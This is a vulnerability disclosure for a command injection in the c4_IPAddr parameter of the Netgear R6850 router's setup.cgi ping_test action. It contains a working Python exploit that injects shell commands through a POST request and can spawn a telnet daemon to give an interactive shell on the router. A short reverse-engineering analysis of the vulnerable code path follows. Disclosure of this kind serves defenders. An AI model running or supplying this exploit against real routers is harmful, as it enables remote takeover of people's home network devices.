# Netgear-R6850 V1.1.0.88 Command Injection(ping_test)

![image-20240319114656029](D:\typora 图片\image-20240319114656029.png)

## Overview

```
* Type: Command Injection
* Supplier: Netgear (https://www.netgear.com/)
* Product: R6850 — AC2000 Smart WiFi Router
* Affect version: (lastest) 1.1.0.88
* Firmware download:https://www.downloads.netgear.com/files/GDC/R6850/R6850_V1.1.0.88.zip
```

## Vulnerability Description

When deal with  `ping_test` request,`c4_IPAddr` parameter is vulnerable to OS command injection.

### POC

The effect of executing the "ls" command

![image-20240319133131323](D:\typora 图片\image-20240319133131323.png)

```python
import requests
import re
import threading
import telnetlib
import time
import argparse

def cmd_exec(target, cmd, silent = False):
    r = requests.post(
        f'http://{target}/setup.cgi?id=0&sp=1337', {
        'todo' : 'ping_test',
        'c4_IPAddr' : f'127.0.0.1 && {cmd}',
        'next_file' : 'diagping.htm'
    })
    content = r.content.decode()
    ping_log = re.findall(
        r'<textarea name="ping_result" .+ readonly >(.+)</textarea>',
        content,
        re.DOTALL
    )
    _, cmd_content = ping_log[0]
    if not silent:
        print(cmd_content.strip())
def yyyy_telnetd(target):
    '''Spawn the telnet server.'''
    cmd_exec(target, '/bin/utelnetd', silent = True)

def main():
    parser = argparse.ArgumentParser('Longue vue')
    parser.add_argument('--shell', action = 'store_true', default = False)
    parser.add_argument('--cmd')
    parser.add_argument('--target', default = 'routerlogin.com')
    args = parser.parse_args()
    if not args.shell and not args.cmd:
        parser.print_help()
        return
    if args.cmd is not None:
        if '-' in args.cmd or ';' in args.cmd:
            print('Both "-" and ";" are disallowed by the command injection bug, use the shell instead.')
            return
        print(f'Executing {repr(args.cmd)} against {args.target}..')
        cmd_exec(args.target, args.cmd)
    if args.shell:
        print(f'Getting a shell against {args.target}..')
        telnetd = threading.Thread(target = yyyy_telnetd, args = (args.target, ))
        telnetd.start()
        print('Waiting a few seconds before connecting..')
        time.sleep(5)
        print('Dropping in the shell, exit with ctrl+c')
        try:
            with telnetlib.Telnet(args.target) as tn:
                tn.mt_interact()
        except:
            pass
        print('Cleaning up..')
        cmd_exec(args.target, '/bin/kill $(/bin/pidof utelnetd)', silent = True)
        print('Joining..')
        telnetd.join()
    print('Done'.center(60, '-'))
main()
```

## Analysis

In the main function of `setup. cgi`, all requests with `setup. cgi` in the URL will be processed by the setup_main function

![image-20240319134651718](D:\typora 图片\image-20240319134651718.png)

It should be noted that a filter (`FindForbidValue`) was applied at the beginning of the function, filtering out some characters and specific functions

![image-20240319134758233](D:\typora 图片\image-20240319134758233.png)

Then go to the `CallActionByName` function, where you will find the characters in the `ActionTab` field

![image-20240319134907840](D:\typora 图片\image-20240319134907840.png)

![image-20240319135037610](D:\typora 图片\image-20240319135037610.png)

In `ActionTab`, you can see the action function corresponding to ping_test(sub_184B0). Here, the `c4-IPAddr`parameter is concatenated into the `myPipe` function using the `snprintf` function (which is actually a self encapsulated `popen`)

![image-20240319135340017](D:\typora 图片\image-20240319135340017.png)